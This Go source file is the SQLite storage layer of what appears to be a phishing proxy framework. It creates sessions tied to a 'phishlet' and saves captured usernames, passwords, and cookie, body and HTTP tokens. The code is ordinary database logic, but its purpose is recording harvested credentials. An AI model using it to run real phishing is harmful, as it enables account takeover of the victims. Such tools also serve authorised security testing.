package database

import (
	"database/sql"
	"fmt"

	_ "modernc.org/sqlite"
)

type Database struct {
	path string
	db   *sql.DB
}

func NewDatabase(path string) (*Database, error) {
	d := &Database{
		path: path,
	}

	var err error
	d.db, err = sql.Open("sqlite", path)
	if err != nil {
		return nil, err
	}

	// Set WAL mode and busy timeout for better concurrency
	pragmas := []string{
		"PRAGMA journal_mode=WAL",
		"PRAGMA busy_timeout=5000",
	}
	for _, p := range pragmas {
		if _, err := d.db.Exec(p); err != nil {
			d.db.Close()
			return nil, fmt.Errorf("failed to set pragma: %w", err)
		}
	}

	if err := d.sessionsInit(); err != nil {
		d.db.Close()
		return nil, err
	}

	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	return d.sessionsList()
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	return d.sessionsUpdateUsername(sid, username)
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	return d.sessionsUpdatePassword(sid, password)
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	return d.sessionsUpdateCustom(sid, name, value)
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	return d.sessionsUpdateBodyTokens(sid, tokens)
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	return d.sessionsUpdateHttpTokens(sid, tokens)
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	return d.sessionsUpdateCookieTokens(sid, tokens)
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	return d.sessionsDelete(s.Id)
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	return d.sessionsDelete(id)
}

func (d *Database) Flush() {
	d.db.Exec("PRAGMA wal_checkpoint(TRUNCATE)")
}
